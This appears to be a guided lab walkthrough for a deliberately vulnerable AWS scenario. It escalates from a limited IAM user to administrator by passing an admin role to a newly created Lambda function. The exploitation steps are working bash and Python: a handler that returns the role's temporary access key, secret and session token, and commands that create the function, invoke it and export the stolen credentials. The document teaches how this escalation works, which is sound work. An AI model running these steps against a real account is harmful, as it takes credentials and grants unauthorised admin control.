# Guided Walkthrough: Privilege Escalation via iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction

This scenario demonstrates a privilege escalation vulnerability where a user has permissions to pass an IAM role to Lambda, create Lambda functions, and invoke them. The attacker can create a Lambda function with an administrative execution role, invoke the function to extract the temporary credentials that Lambda receives, and use those credentials to gain administrator access.

This is a powerful privilege escalation technique because Lambda functions automatically receive temporary security credentials for their execution role through the AWS SDK. An attacker can create a simple function that returns these credentials via environment variables, invoke it, and immediately gain the privileges of the passed role.

The attack leverages the AWS serverless execution model where services like Lambda are granted temporary credentials based on their execution role. By combining `iam:PassRole` with Lambda creation and invocation permissions, an attacker can effectively "borrow" the privileges of any role they can pass to Lambda.

## The Challenge

You start as the IAM user `pl-prod-lambda-001-to-admin-starting-user`. Your credentials were obtained from Terraform outputs after deploying this scenario. This user has a narrow but dangerous permission set:

- `iam:PassRole` scoped to `pl-prod-lambda-001-to-admin-target-role`
- `lambda:CreateFunction` on all resources
- `lambda:InvokeFunction` on all resources

Your goal is to operate as `pl-prod-lambda-001-to-admin-target-role`, which has `AdministratorAccess`. The role already exists in the account -- you just need a way to assume its identity. Direct `sts:AssumeRole` is not available to you, but you can attach it to a Lambda function.

## Reconnaissance

First, confirm your current identity and verify you lack admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::123456789012:user/pl-prod-lambda-001-to-admin-starting-user

aws iam list-users --max-items 1
# An error occurred (AccessDenied) ...
```

Good -- you cannot list IAM users yet. Now check what roles are available (if you have `iam:ListRoles`):

```bash
aws iam list-roles --query 'Roles[?contains(RoleName, `lambda-001`)].{Name:RoleName,Arn:Arn}' --output table
```

You should see `pl-prod-lambda-001-to-admin-target-role` in the output. Note its ARN -- you'll pass this to Lambda in the next step.

## Exploitation

### Step 1: Write the credential-extraction Lambda handler

Create a minimal Python handler that reads credentials from environment variables. Lambda injects the execution role's temporary credentials into the runtime environment automatically:

```bash
cat > /tmp/lambda_function.py << 'EOF'
import json, os

def lambda_handler(event, context):
    return {
        'statusCode': 200,
        'body': json.dumps({
            'AWS_ACCESS_KEY_ID':     os.environ.get('AWS_ACCESS_KEY_ID'),
            'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY'),
            'AWS_SESSION_TOKEN':     os.environ.get('AWS_SESSION_TOKEN'),
            'message': 'Successfully retrieved admin credentials!'
        })
    }
EOF

cd /tmp && zip -q lambda_function.zip lambda_function.py
```

### Step 2: Create the Lambda function with the admin execution role

This is the privilege escalation moment. By specifying the admin role as the `--role`, you are exercising `iam:PassRole` -- attaching an IAM role you don't yourself hold to a compute resource you control:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-001-to-admin-target-role"

aws lambda create-function \
    --function-name pl-lambda-001-credential-extractor \
    --runtime python3.11 \
    --role "$ADMIN_ROLE_ARN" \
    --handler lambda_function.lambda_handler \
    --zip-file fileb:///tmp/lambda_function.zip \
    --timeout 30
```

Lambda accepts the request, creates the function, and binds the admin role to it. AWS will mint temporary credentials for `pl-prod-lambda-001-to-admin-target-role` whenever the function is invoked.

### Step 3: Wait for the function to become active

Lambda needs a few seconds to initialize the execution environment after creation:

```bash
sleep 15
```

### Step 4: Invoke the function and capture the credentials

```bash
aws lambda invoke \
    --function-name pl-lambda-001-credential-extractor \
    --payload '{}' \
    /tmp/response.json

cat /tmp/response.json | jq '.'
```

The response body contains the three credential components from inside the Lambda execution environment:

```json
{
  "statusCode": 200,
  "body": "{\"AWS_ACCESS_KEY_ID\": \"ASIA...\", \"AWS_SECRET_ACCESS_KEY\": \"...\", \"AWS_SESSION_TOKEN\": \"...\"}"
}
```

Parse and export them:

```bash
BODY=$(cat /tmp/response.json | jq -r '.body')
export AWS_ACCESS_KEY_ID=$(echo "$BODY"     | jq -r '.AWS_ACCESS_KEY_ID')
export AWS_SECRET_ACCESS_KEY=$(echo "$BODY" | jq -r '.AWS_SECRET_ACCESS_KEY')
export AWS_SESSION_TOKEN=$(echo "$BODY"     | jq -r '.AWS_SESSION_TOKEN')
```

## Verification

Confirm you are now operating as the admin role:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::123456789012:assumed-role/pl-prod-lambda-001-to-admin-target-role/pl-lambda-001-credential-extractor

aws iam list-users --max-items 3 --output table
# +----+------+-----+
# |         Users   |
# +----+------+-----+
# ...
```

If `list-users` succeeds, you have administrator access. The escalation is complete.

## What Happened

You started with a limited IAM user that could not access any privileged resources directly. The `iam:PassRole` permission -- often granted carelessly alongside compute service permissions -- let you delegate an admin identity to a Lambda function you created. Lambda's execution model then handed you that identity's temporary credentials on a silver platter the moment you invoked the function.

This technique is representative of a broad class of real-world privilege escalation paths: whenever a principal can both (1) pass a privileged role to a compute service and (2) trigger execution on that service, they effectively control the role. The same pattern applies to EC2, ECS, Glue, CodeBuild, SageMaker, and others -- the service is just the intermediary that converts `iam:PassRole` into usable credentials.
